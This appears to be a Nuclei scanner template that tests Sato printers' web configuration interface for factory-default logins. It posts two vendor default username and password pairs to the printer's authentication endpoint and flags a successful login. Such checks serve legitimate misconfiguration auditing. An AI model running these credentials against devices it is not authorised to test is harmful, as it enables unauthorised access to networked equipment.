id: sato-default-login

info:
  name: Sato - Default Login
  author: y0no
  severity: medium
  metadata:
    verified: true
    max-request: 1
  tags: sato,default-login,misconfig,printer


http:
  - raw:
      - |
        POST /WebConfig/lua/auth.lua HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}

        group={{username}}&pw={{password}}

    attack: pitchfork
    payloads:
      username:
        - 'settings'
        - 'service'
      password:
        - '0310'
        - '6677'

    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"r":0'

      - type: status
        status:
          - 200

    extractors:
      - type: json
        part: body
        name: groups
        json:
          - '.groups[]'
